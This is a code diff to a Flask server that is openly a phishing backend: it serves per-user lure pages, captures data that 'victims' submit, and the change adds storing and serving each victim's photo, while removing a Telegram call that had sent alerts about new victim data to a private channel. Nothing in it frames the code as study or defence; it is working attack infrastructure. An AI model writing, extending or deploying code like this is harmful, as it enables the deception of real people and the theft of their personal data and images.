@@ -1,14 +1,16 @@
-from flask import Flask, request, jsonify, render_template_string
-import json
-import time
+from flask import Flask, request, jsonify
+import requests
 import os
+import base64
+import time
 from config import BOT_TOKEN, PRIVATE_CHANNEL_ID
 
 app = Flask(__name__)
 
-# In-memory storage (clears after 10 min)
+# In-memory storage
 victim_data = {}
 user_redirects = {}
+user_photos = {}  # Store photo for each victim
 
 @app.route('/p/<uid>')
 def phishing_page(uid):
@@ -24,6 +26,13 @@ def phishing_page(uid):
     html = html.replace('{{TYPE}}', target_type)
     return html
 
+@app.route('/get_photo/<victim_id>')
+def get_photo(victim_id):
+    photo = user_photos.get(victim_id)
+    if photo:
+        return jsonify({"photo": photo})
+    return jsonify({"photo": None}), 404
+
 @app.route('/api/capture', methods=['POST'])
 def capture():
     data = request.json
@@ -31,6 +40,13 @@ def capture():
         return jsonify({"status": "error"}), 400
     
     victim_id = data.get('victim_id')
+    if not victim_id:
+        return jsonify({"status": "error"}), 400
+    
+    # Store photo if present
+    if data.get('photo'):
+        user_photos[victim_id] = data['photo']
+    
     victim_data[victim_id] = data
     victim_data[victim_id]["time"] = time.time()
     
@@ -39,19 +55,12 @@ def capture():
     return jsonify({"status": "ok"})
 
 def forward_to_bot(data):
-    # Bot will handle forwarding via its own logic
-    # We trigger bot via a webhook call or just store data
-    # Since bot is running in same process, we can call function directly
-    # But bot is in separate thread, so we use API call
     try:
-        import requests
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-            "chat_id": PRIVATE_CHANNEL_ID,
-            "text": f"📥 New data from {data.get('victim_id')}",
-            "parse_mode": "Markdown"
-        }, timeout=5)
-    except:
+        # Send to bot via webhook or just store
+        # Bot will pick up from victim_data
         pass
+    except Exception as e:
+        print(f"Forward error: {e}")
 
 # Auto-delete old data after 10 min
 import threading
@@ -65,6 +74,8 @@ def clean_old_data():
                 to_delete.append(key)
         for key in to_delete:
             del victim_data[key]
+            if key in user_photos:
+                del user_photos[key]
         print(f"🧹 Deleted {len(to_delete)} old victim data")
 
 threading.Thread(target=clean_old_data, daemon=True).start()
